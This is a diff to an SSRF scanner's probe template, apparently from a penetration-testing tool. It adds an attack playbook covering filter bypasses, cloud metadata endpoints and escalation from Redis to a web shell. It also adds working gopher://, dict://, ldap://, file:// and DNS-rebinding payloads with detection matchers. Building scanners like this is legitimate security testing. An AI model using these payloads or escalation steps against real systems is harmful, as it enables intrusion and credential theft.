@@ -1,5 +1,15 @@
 {
   "category": "ssrf",
+  "craft_guidance": [
+    "1. IDENTIFY ENTRY POINT: URL parameters (url=, redirect=, callback=, webhook=), file imports, PDF generators, image fetchers, API integrations.",
+    "2. TEST CONNECTIVITY: Send to Collaborator first. If callback received, SSRF confirmed. If not, try blind via timing (slow internal vs fast external).",
+    "3. BYPASS FILTERS: IP blocked? Use decimal (2130706433), octal (0177.0.0.1), hex (0x7f000001), IPv6 ([::1]), DNS rebinding, or redirect from your server.",
+    "4. CLOUD METADATA: AWS=169.254.169.254 (IMDSv2 needs token PUT first), GCP=metadata.google.internal, Azure=169.254.169.254 (needs Metadata:true header).",
+    "5. PROTOCOL PIVOTING: http:// blocked? Try file:// (local read), gopher:// (Redis/SMTP), dict:// (port scan), ftp://, ldap://.",
+    "6. ESCALATION: Metadata creds -> AWS CLI -> S3/RDS access. Redis -> write web shell or SSH key. Elasticsearch -> dump indices. Internal admin panels -> further exploitation.",
+    "7. BLIND DETECTION: No response body? Use DNS (Collaborator), timing (internal=slow, external=fast), or error differences (connection refused vs timeout vs success).",
+    "8. REDIRECT CHAIN: Target fetches your server -> 302 redirect to internal IP. Bypasses hostname-based filters that only check initial URL."
+  ],
   "contexts": {
     "internal": {
       "description": "SSRF probes targeting internal network resources and localhost services",
@@ -298,6 +308,102 @@
           ],
           "severity": "high",
           "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    },
+    "protocol_variant": {
+      "description": "SSRF via alternative protocol schemes — tests whether server-side fetchers support non-HTTP protocols that can interact with internal services",
+      "tech_match": [],
+      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "probes": [
+        {
+          "payload": "ftp://127.0.0.1/",
+          "description": "FTP protocol SSRF — FTP banner (220, vsFTPd, ProFTPD) in response confirms server-side FTP client support",
+          "matchers": [
+            {"type": "word", "words": ["220", "vsFTPd", "ProFTPD", "FTP", "FileZilla", "Connection refused"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "gopher://127.0.0.1:6379/_INFO%0d%0a",
+          "description": "Gopher to Redis SSRF — gopher protocol sends raw bytes to Redis; redis_version in response confirms gopher support and Redis access",
+          "matchers": [
+            {"type": "word", "words": ["redis_version", "connected_clients", "used_memory", "-ERR"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "gopher://127.0.0.1:11211/_stats%0d%0a",
+          "description": "Gopher to Memcached SSRF — sends stats command via gopher; STAT in response confirms Memcached access",
+          "matchers": [
+            {"type": "word", "words": ["STAT", "pid", "uptime", "version", "END"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "ldap://127.0.0.1/",
+          "description": "LDAP protocol SSRF — LDAP error or connection message confirms server-side LDAP client support and internal reach",
+          "matchers": [
+            {"type": "word", "words": ["ldap", "LDAP", "Distinguished Name", "NamingException", "LDAPException", "connection refused"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "dict://127.0.0.1:6379/INFO",
+          "description": "Dict protocol to Redis SSRF — dict:// sends raw command to Redis; redis_version confirms dict support and Redis access",
+          "matchers": [
+            {"type": "word", "words": ["redis_version", "connected_clients", "used_memory"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        },
+        {
+          "payload": "file:///etc/hostname",
+          "description": "File protocol SSRF — reads local files; non-empty response with short content (hostname) confirms file:// scheme is allowed",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 2},
+            {"type": "not_word", "words": ["not allowed", "blocked", "invalid", "denied", "unsupported"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        }
+      ]
+    },
+    "dns_rebinding": {
+      "description": "SSRF via DNS rebinding — exploits time-of-check vs time-of-use when server validates DNS then fetches, allowing second resolution to point to internal IP",
+      "tech_match": [],
+      "param_match": ["url", "uri", "path", "dest", "redirect", "site", "html", "feed", "to", "out", "callback", "domain", "rurl", "return"],
+      "probes": [
+        {
+          "payload": "http://{{callback}}/ssrf-rebind-check",
+          "description": "DNS rebinding baseline — send Collaborator URL to confirm server-side fetch occurs; Collaborator DNS interaction is prerequisite for rebinding attack",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 0}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        },
+        {
+          "payload": "http://0x7f000001.{{callback}}/",
+          "description": "Hex IP subdomain rebinding probe — some DNS resolvers resolve hex-encoded IPs in subdomains to 127.0.0.1; Collaborator interaction + internal content confirms rebinding",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "not_word", "words": ["blocked", "not allowed", "invalid url", "denied"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
           "variables": {}
         }
       ]
